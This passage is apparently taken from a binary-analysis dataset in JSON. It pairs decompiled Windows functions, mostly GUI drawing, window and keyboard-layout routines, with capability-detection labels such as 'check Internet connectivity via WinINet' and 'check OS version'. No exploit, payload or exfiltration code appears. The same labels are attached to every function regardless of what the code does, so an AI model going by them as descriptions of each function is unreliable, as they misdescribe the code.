     puStack68 = &stack0xffffffd4;\n                puStack72 = param_2;\n                sub.user32.dll_FrameRect();\n                sub.gdi32.dll_DeleteObject(puVar5);\n                uVar3 = fcn.00425c78();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush(uVar3);\n                iVar4 = *(iVar4 + 0x44) + *(iVar4 + 0x4c) + 1;\n                puVar5 = &stack0xffffffc0;\n                puStack72 = uVar3;\n                fcn.0041b080(puVar5, iVar4);\n                sub.user32.dll_FrameRect(param_2, &stack0xffffffb8, puVar5, iVar4, uVar3);\n                sub.gdi32.dll_DeleteObject(puVar5);\n            }\n            iStack36 = iStack36 + -1;\n        } while (iStack36 != 0);\n    }\n    return;\n}\n",
        "token_count": 1117
    },
    "00442080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442080(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lprc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint edge;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    fcn.0043c184();\n    sub.gdi32.dll_IntersectClipRect();\n    iVar3 = 0;\n    edge = 0;\n    uVar1 = fcn.0044407c(0xffffffec);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    if ((uVar2 & 0x200) == 0) {\n        uVar1 = fcn.0044407c(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & 0x800000) != 0) {\n            edge = 3;\n            iVar3 = 0xa00f;\n        }\n    }\n    else {\n        edge = 10;\n        iVar3 = 0x200f;\n    }\n    if (iVar3 != 0) {\n        sub.user32.dll_SetRect(&lprc, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n        sub.user32.dll_DrawEdge();\n        fcn.0043c184();\n        sub.gdi32.dll_IntersectClipRect();\n    }\n    fcn.0043e9fc(0);\n    fcn.0043e9fc(0);\n    if ((*(in_EAX + 0x19c) != 0) && (iVar3 = *(*(in_EAX + 0x19c) + 8),  -1 < iVar3 + -1)) {\n        var_4h = 0;\n        var_10h = iVar3;\n        do {\n            iVar3 = fcn.0041c4c8();\n            if (*(iVar3 + 0x57) != '\\0') {\n                fcn.00442080(*(iVar3 + 0x44));\n            }\n            var_4h = var_4h + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    sub.gdi32.dll_RestoreDC();\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xff7f;\n    return;\n}\n",
        "token_count": 629
    },
    "00442498": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442498(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.00430404();\n    cVar1 = fcn.0043050c();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x7e) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.00426938();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.0044407c();\n        fcn.0043060c(uVar2, arg_ch, arg_10h);\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 295
    },
    "004427c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004427c8(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4428a7;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(*0x484858 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x188) != 0) {\n            fcn.0045b178();\n            iVar2 = fcn.00408ab8();\n            puVar1 = puStack24;\n            if (iVar2 != 0) {\n                piVar3 = fcn.0045af78();\n                iVar2 = (**(*piVar3 + 0x14))();\n                puVar1 = puStack24;\n                if (iVar2 != 0) {\n                    uVar4 = *(**0x484828 + 0x3c);\n                    if (*(in_EAX + 0x184) != '\\0') {\n                        piVar3 = fcn.0045af78();\n                        iVar2 = (**(*piVar3 + 0x54))();\n                        if (-1 < iVar2) {\n                            uStack28 = 0x44286e;\n                            piVar3 = fcn.0045af78();\n                            uStack28 = 0x442875;\n                            uVar4 = (**(*piVar3 + 0x18))();\n                        }\n                    }\n                    uStack28 = 1;\n                    uStack32 = uVar4;\n                    sub.user32.dll_ActivateKeyboardLayout();\n                    puVar1 = puStack24;\n                }\n            }\n        }\n        puStack24 = puVar1;\n        fcn.0044407c();\n        fcn.00448d0c();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4428ae;\n    uStack28 = 0x4428a6;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 514
    },
    "004428b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004428b4(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffe0;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x44293e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x484858 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x188) != 0) {\n            fcn.0045b178();\n            iVar2 = fcn.00408ab8();\n            puVar1 = puStack16;\n            if (iVar2 != 0) {\n                in_stack_ffffffe0 = *(**0x484828 + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffe0, 1);\n                puVar1 = puStack16;\n            }\n        }\n        puStack16 = puVar1;\n        puVar1 = puStack16;\n        if (*(in_EAX + 0x184) == '\\0') {\n            fcn.0044407c();\n            fcn.00448cf0();\n            puVar1 = puStack16;\n        }\n    }\n    puStack16 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffe0;\n    uStack24 = 0x442945;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 383
    },
    "004429a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004429a0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.0041b070();\n    iVar1 = fcn.0043e9fc(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1b2) != 0)) {\n        (**(in_EAX + 0x1b0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004429f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004429f0(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ba) != 0) {\n        (**(in_EAX + 0x1b8))(arg_8h, arg_10h & 0xffffff00 | arg_ch & 0xff, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00442b18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442b18(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.0044407c();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x1d2) != 0) {\n        (**(in_EAX + 0x1d0))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00442b74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00442b74(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00442ae0();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.0041c4c8();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 148
    },
    "00442c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442c20(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x442cc8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1a8)) && (*(in_EAX + 0x1a8) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.0043b4e0();\n        if (param_2 == '\\0') {\n            fcn.00403820();\n            *(in_EAX + 0x178) = 0;\n            fcn.00406298();\n        }\n        else {\n            if (*(in_EAX + 0x178) == 0) {\n                uVar1 = fcn.004037f0();\n                *(in_EAX + 0x178) = uVar1;\n            }\n            fcn.00403a28();\n            fcn.004062b0();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x442ccf;\n    uStack28 = 0x442cc7;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 350
    },
    "00442cd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442cd8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x44);\n        uStack24 = *(iVar1 + 0x48);\n        uStack20 = *(iVar1 + 0x4c);\n        uStack16 = *(iVar1 + 0x50);\n        uStack44 = 2;\n        puStack48 = &fcn.00442cd8::var_18h;\n        uStack52 = 0x442d12;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.0044407c();\n        uStack56 = 0;\n        puStack60 = 0x442d1a;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x442d22;\n        fcn.004408d4();\n        uStack64 = 0x442d9a;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.00403a28();\n        if ((*(var_4h + 0x1a7) != '\\0') && (*(var_4h + 0x17c) != 0)) {\n            (**(**(var_4h + 0x17c) + 0x18))(*(*(var_8h + 4) + 0x58));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x442da1;\n        uStack64 = 0x442d99;\n        fcn.004408dc();\n        return;\n    }\n    return;\n}\n",
        "token_count": 525
    },
    "00442dc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442dc4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1a7) != '\\0') && (*(in_EAX + 0x17c) != 0)) {\n        (**(**(in_EAX + 0x17c) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00442dec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442dec(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x442e01;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x442e0b;\n    iVar3 = fcn.00403764();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x442e56;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00403a28();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x442e67;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x442e55;\n            fcn.0043daa8();\n        }\n        return;\n    }\n    puStack24 = 0x442e67;\n    fcn.0043f6c4();\n    return;\n}\n",
        "token_count": 295
    },
    "00442e98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00442e98(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.004544bc();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x22d) != '\\0')) {\n        cVar1 = fcn.00442e98();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x00442ef5;\n    }\n    uVar2 = fcn.004543c4();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.00403a28();\n        if (*(param_2 + 4) == 0) goto code_r0x00442ef5;\n    }\n    uVar4 = 0;\ncode_r0x00442ef5:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 304
    },
    "00442f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00442f80(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.004544bc();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x22d) != '\\0')) {\n        cVar1 = fcn.00442f80();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x00442fdd;\n    }\n    uVar2 = fcn.004543c4();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.00403a28();\n        if (*(param_2 + 4) == 0) goto code_r0x00442fdd;\n    }\n    uVar4 = 0;\ncode_r0x00442fdd:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 304
    },
    "00443048": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00443048(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.004544bc();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x22d) != '\\0')) {\n        cVar2 = fcn.00443048();\n        if (cVar2 != '\\0') goto code_r0x004430a4;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.00403a28();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x004430a4;\n    }\n    uVar4 = 0;\ncode_r0x004430a4:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 316
    },
    "004432e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004432e8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 105
    },
    "0044330c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0044330c(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.0043cb14();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.00440d74();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.00440d38();\n                uVar1 = fcn.00403a28();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 220
    },
    "004433c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004433c0(uint param_1, int32_t param_2)\n\n{\n    fcn.0043f4d8();\n    if ((*(*0x484858 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.004415e4();\n    }\n    fcn.00440dd4();\n    return;\n}\n",
        "token_count": 90
    },
    "004433f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004433f8(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(*0x484858 + 0xd) != '\\0') {\n        cVar1 = fcn.0043de80();\n        if (cVar1 == '\\0') {\n            if (*(**0x48466c + 0x3c) != 0) {\n                uVar2 = fcn.00404a88(1);\n                sub.user32.dll_LoadKeyboardLayoutA(uVar2);\n            }\n        }\n        else if (*(**0x48466c + 0x38) != 0) {\n            uVar2 = fcn.00404a88(1);\n            sub.user32.dll_LoadKeyboardLayoutA(uVar2);\n        }\n    }\n    fcn.00403a28();\n    return;\n}\n",
        "token_count": 186
    },
    "004434d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004434d8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.00440b34();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.00441738();\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00443530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443530(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = (**(*in_EAX + 0x50))();\n    if ((cVar1 == '\\0') && (in_EAX[0xc] != 0)) {\n        fcn.00440b34();\n    }\n    cVar1 = fcn.00444380();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 0x10) == 0)) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        sub.user32.dll_EnableWindow(in_EAX[0x60], -(cVar1 != '\\0'));\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "0044361c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044361c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    \n    (**(*in_EAX + -0x10))();\n    cVar1 = fcn.00444380();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0044407c(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar2);\n        if (*(in_EAX + 0x57) != '\\0') {\n            (**(*in_EAX + 0x7c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0044365c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044365c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x180));\n            if (iVar2 != 0) {\n                fcn.00443f84();\n            }\n        }\n    }\n    fcn.00440dd4();\n    return;\n}\n",
        "token_count": 155
    },
    "00443788": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00443788(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar2 = fcn.00403a28();\n                if ((iVar2 != 0) && (*(iVar2 + 0x38) != 0)) {\n                    uVar3 = fcn.00403a28();\n                    if (uVar3 != '\\0') goto code_r0x00443811;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar2 = fcn.004544bc();\n        if (iVar2 != 0) {\n            uVar3 = fcn.00403a28();\n            if (uVar3 != '\\0') goto code_r0x00443811;\n        }\n    }\n    uVar3 = fcn.0043a768();\n    if (uVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x00443811:\n    return CONCAT44(uStack20, uVar3 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 354
    },
    "00443bfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443bfc(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x180);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x180), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.00440d74();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00440d38();\n            cVar2 = fcn.004039b8();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x180) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x180);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.004408fc();\n    return;\n}\n",
        "token_count": 379
    },
    "00443cec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
